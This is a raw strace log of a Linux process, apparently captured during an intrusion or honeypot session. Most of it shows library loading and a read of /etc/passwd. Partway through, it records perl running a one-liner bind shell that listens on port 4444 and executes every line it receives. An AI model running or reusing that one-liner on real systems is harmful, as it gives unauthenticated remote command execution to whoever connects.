\0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\340n\0\0\340~\0\0\340~\0\0\24\1\0\0\24\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\32\0\0\0&\0\0\0\4\0\0\0\7\0\0\0Q\0\200\2@\t\21\r\0\4\33\200\21H\262\201&\0\0\0\'\0\0\0(\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0)\0\0\0*\0\0\0+\0\0\0\0\0\0\0-\0\0\0\0\0\0\0\0\0\0\0/\0\0\0000\0\0\0001\0\0\0\0\0\0\0\0\0\0\0002\0\0\0\0\0\0\0003\0\0\0004\0\0\0\0\0\0\0005\0\0\0\207[\246\22\365\33=\274\365\365K\23\0012\310%;]^\2674\10\301\346\357\37>\346\312\271\330\2749\303M%", 512) = 512
12516 20:27:41.260008 fstat64(1, {st_mode=S_IFREG|0644, st_size=30436, ...}) = 0
12516 20:27:41.260026 mmap2(NULL, 33352, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7d68000
12516 20:27:41.260038 mmap2(0xb7d6f000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x6) = 0xb7d6f000
12516 20:27:41.260055 close(1)          = 0
12516 20:27:41.260074 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
12516 20:27:41.260089 open("/lib/tls/i686/cmov/libnsl.so.1", O_RDONLY) = 1
12516 20:27:41.260103 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\00001\0\0004\0\0\0\234B\1\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\340,\1\0\340,\1\0\340,\1\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\3407\1\0\3407\1\0\5\0\0\0\0\20\0\0\1\0\0\0\300>\1\0\300N\1\0\300N\1\0\350\2\0\0()\0\0\6\0\0\0\0\20\0\0\2\0\0\0\324>\1\0\324N\1\0\324N\1\0\340\0\0\0\340\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\300>\1\0\300N\1\0\300N\1\0004\1\0\0004\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\374\0\0\0q\0\0\0 \0\0\0\n\0\0\0\1\1$\232 \'Q\0@ \0\0\f\1\1\n\1\n\0\0\240:X\0@\1\16$\10\4\200\n`\260\23 @\24\21\20@\3442\324\4H\346\0\1`\3@\260\272\2019\30\235\340\0\0\332\200\0044\2\201J\20{\203+\200\22 d\21\1\0\2\200\306 d`A\n\4\4\4\v\4PD@\200\20\0\22 \4\340@\1\32 \4\2\20\10\0\0\204\260\200\0\340\23\0\212$\0\206\210\0\2`@q\0\0\0\0\0\0\0\0\0\0\0r\0\0\0\0\0\0\0t\0\0\0\0\0\0\0", 512) = 512
12516 20:27:41.260191 fstat64(1, {st_mode=S_IFREG|0644, st_size=83708, ...}) = 0
12516 20:27:41.260213 mmap2(NULL, 96232, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7d50000
12516 20:27:41.260224 mmap2(0xb7d64000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x13) = 0xb7d64000
12516 20:27:41.260240 mmap2(0xb7d66000, 6120, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7d66000
12516 20:27:41.260255 close(1)          = 0
12516 20:27:41.260282 munmap(0xb7ef6000, 29913) = 0
12516 20:27:41.260300 open("/etc/ld.so.cache", O_RDONLY) = 1
12516 20:27:41.260313 fstat64(1, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
12516 20:27:41.260329 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 1, 0) = 0xb7ef6000
12516 20:27:41.260339 close(1)          = 0
12516 20:27:41.260350 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
12516 20:27:41.260365 open("/lib/tls/i686/cmov/libnss_nis.so.2", O_RDONLY) = 1
12516 20:27:41.260379 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\20\31\0\0004\0\0\0\320\201\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\350x\0\0\350x\0\0\350x\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\310}\0\0\310}\0\0\5\0\0\0\0\20\0\0\1\0\0\0\334~\0\0\334\216\0\0\334\216\0\0\374\1\0\0`\3\0\0\6\0\0\0\0\20\0\0\2\0\0\0\360~\0\0\360\216\0\0\360\216\0\0\360\0\0\0\360\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\334~\0\0\334\216\0\0\334\216\0\0\30\1\0\0\30\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0g\0\0\0000\0\0\0\20\0\0\0\t\0\0\0\2\0\0H  \26\20\0\0@g\3\0\3\6\30\24\0248A\30&\243\301\200\212\0048\21\10 B@\310\24\344\20\311\244\10\0\4\0\0@\0P!\0\0\204\0\0\0\0@\v\0y\243\0D\202\0\0\0\0000\0\0\0001\0\0\0\0\0\0\0002\0\0\0003\0\0\0004\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0005\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0006\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0007\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", 512) = 512
12516 20:27:41.260468 fstat64(1, {st_mode=S_IFREG|0644, st_size=34352, ...}) = 0
12516 20:27:41.260486 mmap2(NULL, 37436, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7d46000
12516 20:27:41.260497 mmap2(0xb7d4e000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x7) = 0xb7d4e000
12516 20:27:41.260514 close(1)          = 0
12516 20:27:41.260526 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
12516 20:27:41.260540 open("/lib/tls/i686/cmov/libnss_files.so.2", O_RDONLY) = 1
12516 20:27:41.260555 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\340\30\0\0004\0\0\0\254\221\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\330\206\0\0\330\206\0\0\330\206\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\240\213\0\0\240\213\0\0\5\0\0\0\0\20\0\0\1\0\0\0\350\216\0\0\350\236\0\0\350\236\0\0\314\1\0\0\260\3\0\0\6\0\0\0\0\20\0\0\2\0\0\0\374\216\0\0\374\236\0\0\374\236\0\0\340\0\0\0\340\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\350\216\0\0\350\236\0\0\350\236\0\0\f\1\0\0\f\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0k\0\0\0.\0\0\0\20\0\0\0\t\0\0\0\"F\340\24\240\240\245\1\31\10\200\20\203\6\212\10\0\0\222@]\1(\nx\10 \"\220\200\20,\5\1\204\4)!\0224\0\24\0\31\0\0\2\2\210@\0\200@0\210\201@@\200\0B\0\6\300.\0\0\0\0\0\0\0\0\0\0\0/\0\0\0000\0\0\0001\0\0\0002\0\0\0003\0\0\0\0\0\0\0004\0\0\0\0\0\0\0005\0\0\0007\0\0\0008\0\0\0\0\0\0\0:\0\0\0\0\0\0\0;\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", 512) = 512
12516 20:27:41.260697 fstat64(1, {st_mode=S_IFREG|0644, st_size=38412, ...}) = 0
12516 20:27:41.260715 mmap2(NULL, 41624, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7d3b000
12516 20:27:41.260727 mmap2(0xb7d44000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x8) = 0xb7d44000
12516 20:27:41.260748 close(1)          = 0
12516 20:27:41.260769 munmap(0xb7ef6000, 29913) = 0
12516 20:27:41.260786 open("/etc/passwd", O_RDONLY|0x80000 /* O_??? */) = 1
12516 20:27:41.260801 fcntl64(1, F_GETFD) = 0x1 (flags FD_CLOEXEC)
12516 20:27:41.260812 _llseek(1, 0, [0], SEEK_CUR) = 0
12516 20:27:41.260825 fstat64(1, {st_mode=S_IFREG|0644, st_size=1624, ...}) = 0
12516 20:27:41.260841 mmap2(NULL, 1624, PROT_READ, MAP_SHARED, 1, 0) = 0xb7efd000
12516 20:27:41.260853 _llseek(1, 1624, [1624], SEEK_SET) = 0
12516 20:27:41.260868 munmap(0xb7efd000, 1624) = 0
12516 20:27:41.260878 close(1)          = 0
12516 20:27:41.260906 getpgrp()         = 3831
12516 20:27:41.260917 rt_sigaction(SIGCHLD, {0x807e540, [], 0}, {SIG_DFL}, 8) = 0
12516 20:27:41.260932 getrlimit(RLIMIT_NPROC, {rlim_cur=8191, rlim_max=8191}) = 0
12516 20:27:41.260948 brk(0x8101000)    = 0x8101000
12516 20:27:41.260980 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
12516 20:27:41.260995 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
12516 20:27:41.261010 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
12516 20:27:41.261047 brk(0x8102000)    = 0x8102000
12516 20:27:41.261083 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
12516 20:27:41.261104 stat64("/sbin/AB", 0xbfed9d38) = -1 ENOENT (No such file or directory)
12516 20:27:41.261116 stat64("/bin/AB", 0xbfed9d38) = -1 ENOENT (No such file or directory)
12516 20:27:41.261128 stat64("/usr/sbin/AB", 0xbfed9d38) = -1 ENOENT (No such file or directory)
12516 20:27:41.261140 stat64("/usr/bin/AB", 0xbfed9d38) = -1 ENOENT (No such file or directory)
12516 20:27:41.261153 rt_sigprocmask(SIG_BLOCK, [INT CHLD], [], 8) = 0
12516 20:27:41.261168 clone(child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0xb7d716f8) = 12517
12517 20:27:41.261217 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
12517 20:27:41.261234 rt_sigaction(SIGTSTP, {SIG_DFL}, {SIG_DFL}, 8) = 0
12517 20:27:41.261247 rt_sigaction(SIGTTIN, {SIG_DFL}, {SIG_DFL}, 8) = 0
12517 20:27:41.261259 rt_sigaction(SIGTTOU, {SIG_DFL}, {SIG_DFL}, 8) = 0
12517 20:27:41.261275 rt_sigaction(SIGINT, {SIG_DFL}, {SIG_DFL}, 8) = 0
12517 20:27:41.261291 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
12517 20:27:41.261304 rt_sigaction(SIGCHLD, {SIG_DFL}, {0x807e540, [], 0}, 8) = 0
12517 20:27:41.261360 write(2, "sh: AB: command not found\n", 26) = -1 EPIPE (Broken pipe)
12517 20:27:41.261374 --- SIGPIPE (Broken pipe) @ 0 (0) ---
12517 20:27:41.261447 exit_group(127)   = ?
12516 20:27:41.547291 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
12516 20:27:41.547291 --- SIGCHLD (Child exited) @ 0 (0) ---
12516 20:27:41.547291 waitpid(-1,  <unfinished ...>
4519  20:27:41.547295 waitpid(12516,  <unfinished ...>
12516 20:27:41.547316 <... waitpid resumed> [{WIFEXITED(s) && WEXITSTATUS(s) == 127}], WNOHANG) = 12517
12516 20:27:41.717137 waitpid(-1, 0xbfed99b8, WNOHANG) = -1 ECHILD (No child processes)
12516 20:27:41.717167 sigreturn()       = ? (mask now [])
12516 20:27:41.717199 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
12516 20:27:41.717215 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
12516 20:27:41.717227 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
12516 20:27:41.717240 rt_sigaction(SIGINT, {0x807f150, [], 0}, {SIG_DFL}, 8) = 0
12516 20:27:41.717272 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
12516 20:27:41.717284 rt_sigaction(SIGINT, {SIG_DFL}, {0x807f150, [], 0}, 8) = 0
12516 20:27:41.717320 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
12516 20:27:41.717341 stat64("/sbin/perl", 0xbfed9d68) = -1 ENOENT (No such file or directory)
12516 20:27:41.717353 stat64("/bin/perl", 0xbfed9d68) = -1 ENOENT (No such file or directory)
12516 20:27:41.717365 stat64("/usr/sbin/perl", 0xbfed9d68) = -1 ENOENT (No such file or directory)
12516 20:27:41.717377 stat64("/usr/bin/perl", {st_mode=S_IFREG|0755, st_size=1080724, ...}) = 0
12516 20:27:41.717395 stat64("/usr/bin/perl", {st_mode=S_IFREG|0755, st_size=1080724, ...}) = 0
12516 20:27:41.717420 rt_sigprocmask(SIG_BLOCK, [INT CHLD], [], 8) = 0
12516 20:27:41.717435 clone(child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0xb7d716f8) = 12518
12518 20:27:41.768014 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
12518 20:27:41.768050 rt_sigaction(SIGTSTP, {SIG_DFL}, {SIG_DFL}, 8) = 0
12518 20:27:41.768064 rt_sigaction(SIGTTIN, {SIG_DFL}, {SIG_DFL}, 8) = 0
12518 20:27:41.768077 rt_sigaction(SIGTTOU, {SIG_DFL}, {SIG_DFL}, 8) = 0
12518 20:27:41.768092 rt_sigaction(SIGINT, {SIG_DFL}, {SIG_DFL}, 8) = 0
12518 20:27:41.768109 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
12518 20:27:41.768122 rt_sigaction(SIGCHLD, {SIG_DFL}, {0x807e540, [], 0}, 8) = 0
12518 20:27:41.768162 execve("/usr/bin/perl", ["perl", "-MIO", "-e", "$p=fork();exit,if$p;foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(LocalPort,4444,Reuse,1,Listen)->accept;$~->fdopen($c,w);STDIN->fdopen($c,r);while(<>){if($_=~ /(.*)/){system $1;}};"], [/* 14 vars */]) = 0
12518 20:27:41.768264 brk(0)            = 0x8153000
12518 20:27:41.768286 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
12518 20:27:41.768304 mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7fa2000
12518 20:27:41.768321 access("/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
12518 20:27:41.768338 open("/etc/ld.so.cache", O_RDONLY) = 1
12518 20:27:41.768351 fstat64(1, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
12518 20:27:41.768370 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 1, 0) = 0xb7f9a000
12518 20:27:41.768380 close(1)          = 0
12518 20:27:41.768392 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
12518 20:27:41.768407 open("/lib/tls/i686/cmov/libdl.so.2", O_RDONLY) = 1
12518 20:27:41.768422 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0p\n\0\0004\0\0\0L!\0\0\0\0\0\0004\0 \0\10\0(\0\35\0\34\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0003\33\0\0003\33\0\0003\33\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\374\34\0\0\374\34\0\0\5\0\0\0\0\20\0\0\1\0\0\0\264\36\0\0\264.\0\0\264.\0\0\230\1\0\0\310\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\320\36\0\0\320.\0\0\320.\0\0\370\0\0\0\370\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\264\36\0\0\264.\0\0\264.\0\0@\1\0\0@\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\26\0\0\0\31\0\0\0\4\0\0\0\7\0\0\0\230\0\21\0\0B\0\0\202\0`\10\223(\10\336\31\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\32\0\0\0\0\0\0\0\33\0\0\0\34\0\0\0\0\0\0\0\36\0\0\0\0\0\0\0\0\0\0\0\37\0\0\0!\0\0\0\"\0\0\0\0\0\0\0\0\0\0\0#\0\0\0%\0\0\0&\0\0\0\0\0\0\0(\0\0\0\221!\374\370\225\263_\31\5\350\7\371\6\2\4\371\7\2\4\371\301S\200\30\256\304M\17a\242\222\6\325=l\366\327=l\366\370\31sB\353\26\251\30\373\31sB", 512) = 512
12518 20:27:41.768529 fstat64(1, {st_mode=S_IFREG|0644, st_size=9684, ...}) = 0
12518 20:27:41.768548 mmap2(NULL, 12412, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7f96000
12518 20:27:41.768560 mmap2(0xb7f98000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x1) = 0xb7f98000
12518 20:27:41.768577 close(1)          = 0
12518 20:27:41.768589 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
12518 20:27:41.768604 open("/lib/tls/i686/cmov/libm.so.6", O_RDONLY) = 1
12518 20:27:41.768618 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0@4\0\0004\0\0\0PB\2\0\0\0\0\0004\0 \0\t\0(\0 \0\37\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0 \1\0\0 \1\0\0\5\0\0\0\4\0\0\0\3\0\0\0x\20\2\0x\20\2\0x\20\2\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0$/\2\0$/\2\0\5\0\0\0\0\20\0\0\1\0\0\0\334>\2\0\334>\2\0\334>\2\0`\1\0\0\244\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\360>\2\0\360>\2\0\360>\2\0\350\0\0\0\350\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0T\1\0\0T\1\0\0T\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0P\345td\214\20\2\0\214\20\2\0\214\20\2\0\34\4\0\0\34\4\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\334>\2\0\334>\2\0\334>\2\0\30\1\0\0\30\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\214\2\0\0\17\0\0\0@\0\0\0\v\0\0\0%\220 \305\t\204g\v\0\302\20 \4iER\202\20\200\240\0}\210\272\10\10I\0\0\0\0\0\33\4\201\0\0\0\232U\20A P \200\224\202\220\21@\3722\0\304a\24\0\10\6\306\220\232\f\207\300 \250\0  \202\0\230\201\4E\7\0054a\2\0\0\251C\30\310 \10\23\30\24M8\"\0\22\24\21@T\203\2E\1\1\1\244\fX\20\0\210\2\0 \0@\0$\214\5\10", 512) = 512
12518 20:27:41.768712 fstat64(1, {st_mode=S_IFREG|0644, st_size=149328, ...}) = 0
12518 20:27:41.768730 mmap2(NULL, 147584, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7f71000
12518 20:27:41.768741 mmap2(0xb7f94000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x23) = 0xb7f94000
12518 20:27:41.768758 close(1)          = 0
12518 20:27:41.768770 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
12518 20:27:41.768784 open("/lib/tls/i686/cmov/libpthread.so.0", O_RDONLY) = 1
12518 20:27:41.768798 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\20H\0\0004\0\0\0\330C\1\0\0\0\0\0004\0 \0\t\0(\0$\0!\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0 \1\0\0 \1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\224\n\1\0\224\n\1\0\224\n\1\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\4;\1\0\4;\1\0\5\0\0\0\0\20\0\0\1\0\0\0\344=\1\0\344M\1\0\344M\1\0T\3\0\0\374#\0\0\6\0\0\0\0\20\0\0\2\0\0\0\324>\1\0\324N\1\0\324N\1\0\370\0\0\0\370\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0T\1\0\0T\1\0\0T\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0P\345td\250\n\1\0\250\n\1\0\250\n\1\0\314\4\0\0\314\4\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\344=\1\0\344M\1\0\344M\1\0\20\2\0\0\20\2\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\262\1\0\0L\0\0\0@\0\0\0\v\0\0\0\31!\2\221\1\n\20\"@H \331\3\0I4\200\0\0@\0 \200\200\21P`@@\22\213\0020D\0\0\20\0\0\2\0\1\r\0\204\n\360\1X\260\r\240\200\10 $\204\20B\242)m\10G\234V\20\0\224 \204$\10\0H(\1\222\34\301B\240\220\22\10\f \2\30`A\244c\4\0\n\32\3\0\0)\0(\314@\204\210L\22\10\241\0\4\0\10\0\300Q\0\2009\4C\300", 512) = 512
12518 20:27:41.768885 fstat64(1, {st_mode=S_IFREG|0755, st_size=112354, ...}) = 0
12518 20:27:41.768901 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f70000
12518 20:27:41.768915 mmap2(NULL, 94688, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7f58000
12518 20:27:41.768926 mmap2(0xb7f6c000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x13) = 0xb7f6c000
12518 20:27:41.768940 mmap2(0xb7f6e000, 4576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7f6e000
12518 20:27:41.768961 close(1)          = 0
12518 20:27:41.768974 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
12518 20:27:41.769016 open("/lib/tls/i686/cmov/libc.so.6", O_RDONLY) = 1
12518 20:27:41.769045 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\260e\1\0004\0\0\0\4\307\24\0\0\0\0\0004\0 \0\n\0(\0D\0C\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0@\1\0\0@\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\2200\23\0\2200\23\0\2200\23\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0(\215\24\0(\215\24\0\5\0\0\0\0\20\0\0\1\0\0\0\354\221\24\0\354\221\24\0\354\221\24\0\260\'\0\0\204T\0\0\6\0\0\0\0\20\0\0\2\0\0\0\234\255\24\0\234\255\24\0\234\255\24\0\360\0\0\0\360\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0t\1\0\0t\1\0\0t\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0\7\0\0\0\354\221\24\0\354\221\24\0\354\221\24\0\10\0\0\0,\0\0\0\4\0\0\0\4\0\0\0P\345td\2440\23\0\2440\23\0\2440\23\0\354+\0\0\354+\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\354\221\24\0\354\221\24\0\354\221\24\0\10\36\0\0\10\36\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\363\3\0\0\n\0\0\0\0\2\0\0\16\0\0\0\2400\20D\200 \2\1\214\3\346\220AE\210\0\204\0\10\0A\200\0@\300\200\0\f\2\f\0\0010\0\10@\"\10\246\4\210H6l\240\0260\0&\204\200\216\4\10B$\2\f\246\244\32\6c\310\0\302 \1\300\0R\0!\201\10\4\n  \250\24\0\24(`\0\0P\240\312DB", 512) = 512
12518 20:27:41.769134 fstat64(1, {st_mode=S_IFREG|0755, st_size=1364388, ...}) = 0
12518 20:27:41.769155 mmap2(NULL, 1369712, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7e09000
12518 20:27:41.769167 mmap2(0xb7f52000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x149) = 0xb7f52000
12518 20:27:41.769182 mmap2(0xb7f55000, 9840, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7f55000
12518 20:27:41.769196 close(1)          = 0
12518 20:27:41.769208 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
12518 20:27:41.769221 open("/lib/tls/i686/cmov/libcrypt.so.1", O_RDONLY) = 1
12518 20:27:41.769235 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0000\7\0\0004\0\0\0<\221\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\340\210\0\0\340\210\0\0\340\210\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\f\212\0\0\f\212\0\0\5\0\0\0\0\20\0\0\1\0\0\0\350\216\0\0\350\236\0\0\350\236\0\0`\1\0\0tr\2\0\6\0\0\0\0\20\0\0\2\0\0\0\374\216\0\0\374\236\0\0\374\236\0\0\340\0\0\0\340\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\350\216\0\0\350\236\0\0\350\236\0\0\f\1\0\0\f\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\17\0\0\0\22\0\0\0\2\0\0\0\6\0\0\0\4\311\240, 